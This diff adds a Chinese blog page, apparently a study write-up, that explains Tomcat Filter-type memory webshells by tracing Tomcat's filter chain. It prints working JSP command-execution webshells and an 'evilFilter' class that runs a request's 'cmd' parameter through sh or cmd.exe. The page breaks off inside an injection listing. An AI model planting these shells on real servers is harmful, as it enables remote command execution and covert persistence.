@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言当我们访问一个java网站的路由时在请求到达Servlet前，会经过若干自定义的Filter拦截器假使动态注册恶意 Filter，并且将其放到 最前面，那么我们就实现的命令执行内存马   思路再次之前，我们要学会如何搭建一个Servlet服务可以看这位师傅的博客https:&#x2F;&#x2F;drun1baby.top&#x2F;2022&#x2F;08&#x2F;22&#x2F;Servlet-%E9%A1%B9%E7%9B%AE%E6%90%A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tomcat-Filter型内存马">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="前言当我们访问一个java网站的路由时在请求到达Servlet前，会经过若干自定义的Filter拦截器假使动态注册恶意 Filter，并且将其放到 最前面，那么我们就实现的命令执行内存马   思路再次之前，我们要学会如何搭建一个Servlet服务可以看这位师傅的博客https:&#x2F;&#x2F;drun1baby.top&#x2F;2022&#x2F;08&#x2F;22&#x2F;Servlet-%E9%A1%B9%E7%9B%AE%E6%90%A">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231600348.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231601892.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231647896.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231846776.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251016135144458.png">
+<meta property="article:published_time" content="2025-10-23T12:24:55.000Z">
+<meta property="article:modified_time" content="2025-10-23T12:27:29.868Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="内存马">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231600348.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tomcat-Filter型内存马</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/Listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/%E7%9C%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%87%8C%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&text=Tomcat-Filter型内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=Tomcat-Filter型内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tomcat-Filter型内存马&body=Check out this article: https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&title=Tomcat-Filter型内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&name=Tomcat-Filter型内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/&t=Tomcat-Filter型内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">具体实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsp%E9%A9%AC"><span class="toc-number">3.1.</span> <span class="toc-text">jsp马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Tomcat-Filter型内存马
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-10-23T12:24:55.000Z" class="dt-published" itemprop="datePublished">2025-10-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a> › <a class="category-link" href="/categories/Java/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们访问一个java网站的路由时<br>在请求到达Servlet前，会经过若干自定义的Filter拦截器<br>假使<strong>动态注册恶意 Filter，并且将其放到 最前面</strong>，那么我们就实现的命令执行内存马  </p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>再次之前，我们要学会如何搭建一个Servlet服务<br>可以看这位师傅的博客<code>https://drun1baby.top/2022/08/22/Servlet-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/#%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%90%AD%E5%BB%BA%E6%96%B9%E5%BC%8F</code><br>能搭好一个服务之后，正式开始内存马学习<br>java目录下写入一个filter类<br>web.xml</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;web-app xmlns=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="line">         xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">         xsi:schemaLocation=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="line">         version=<span class="string">&quot;4.0&quot;</span>&gt;</span><br><span class="line">    &lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;filter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;&lt;/web-app&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这样在访问&#x2F;filter时，会进入filter类里面<br>现在我们尝试调试进入filter之后会发生什么<br>单步调试进ApplicationFilterChain#doFilter<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231600348.png"><br>走到Globals.IS_SECURITY_ENABLED，进入<code>internalDoFilter</code><br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231601892.png"><br>这里就一直循环，上一个 Filter.doFilter() 方法中调用 FilterChain.doFilter() 方法将调用下一个 Filter.doFilter() 方法，最后一个Filter调用<code>Servlet.service()</code><br>当然，更重要的是去分析Filter是如何被建立的，这涉及到我们内存马的创建<br>我们在init打个断点，看此前的调用栈<br>可能是版本的问题，无法找到和作者一样的断点<br>全局搜索还是存在的，关键类是<code>StandardEngineValve#invoke</code> 再往后就是一步步调用invoke，结合这张图是<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231647896.png"><br>最后是在最后一个管道的地方会创建一个链子，这个链子是 FilterChain，再对里头的 filter 进行一些相关的匹配。<br>最关键的在这一处StandardContext#findFilterConfig</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> FilterConfig <span class="title function_">findFilterConfig</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (FilterConfig)<span class="built_in">this</span>.filterConfigs.get(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造含有恶意的 filter 的 filterConfig 和拦截器 filterMaps，就可以达到触发目的了，并且它们都是从 StandardContext 中来的。</span><br></pre></td></tr></table></figure></div>
+<p>而拦截器，对应之前web.xml里的filter-mapping 标签<br>以下就将延续这个东西进行展开<br>这里需要讲解一些基础概念<br>我们知道在standardContext类(是一个容器类，它负责存储整个 Web 应用程序的数据和对象，并加载了 web.xml 中配置的多个 Servlet、Filter 对象以及它们的映射关系)里面，有几个与filter相关的变量  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filterConfigs</span><br><span class="line">filterDefs</span><br><span class="line">filterMaps</span><br><span class="line">filterMaps 中的FilterMap则记录了不同filter与UrlPattern的映射关系</span><br></pre></td></tr></table></figure></div>
+<p>在init之初  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="built_in">this</span>.filterConfigs) &#123;</span><br><span class="line">            <span class="built_in">this</span>.filterConfigs.clear();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(Map.Entry&lt;String, FilterDef&gt; entry : <span class="built_in">this</span>.filterDefs.entrySet()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, (FilterDef)entry.getValue());</span><br><span class="line">                    <span class="built_in">this</span>.filterConfigs.put(name, filterConfig);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    <span class="type">Throwable</span> <span class="variable">filterConfig</span> <span class="operator">=</span> ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                    ExceptionUtils.handleThrowable(filterConfig);</span><br><span class="line">                    <span class="built_in">this</span>.getLogger().error(sm.getString(<span class="string">&quot;standardContext.filterStart&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;name&#125;), filterConfig);</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> ok;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>看到这里有点懵，对java某些特性有点不熟悉，哎<br>大佬的思路是 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">通过前文分析，得出构造的主要思路如下</span><br><span class="line">1、获取当前应用的ServletContext对象</span><br><span class="line">2、通过ServletContext对象再获取filterConfigs</span><br><span class="line">2、接着实现自定义想要注入的filter对象</span><br><span class="line">4、然后为自定义对象的filter创建一个FilterDef</span><br><span class="line">5、最后把 ServletContext对象、filter对象、FilterDef全部都设置到filterConfigs即可完成内存马的实现</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="jsp马"><a href="#jsp马" class="headerlink" title="jsp马"></a>jsp马</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSP"><figure class="iseeu highlight /jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));%&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这是一个简单的无回显马  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSP"><figure class="iseeu highlight /jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">        out.print(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这是一个简单的回显马<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251015231846776.png"><br>现在，我们直接写一个恶意Filter</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;  </span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) request;  </span><br><span class="line"> <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) response;  </span><br><span class="line"> <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;  </span><br><span class="line"> <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);  </span><br><span class="line"> <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;  </span><br><span class="line">                isLinux = <span class="literal">false</span>;  </span><br><span class="line"> &#125;  </span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;  </span><br><span class="line"> <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();  </span><br><span class="line"> <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);  </span><br><span class="line"> <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;  </span><br><span class="line"> resp.getWriter().write(output);  </span><br><span class="line"> resp.getWriter().flush();  </span><br><span class="line"> &#125;  </span><br><span class="line">        chain.doFilter(request, response);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>直接改<code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code><br>可以实现<br><img src="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20251016135144458.png"><br>改成&#x2F;evilFilter就不行了，没有回显<br>而现实想实现上述效果，就需要我们把Filter动态导入进去<br>知 <code>StandardContext</code> Filter实例存放在filterConfigs、filterDefs、filterMaps这三个变量里面，将fifter添加到这三个变量中即可将内存马打入<br>如何获取变量呢？<br>直接给出jsp </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 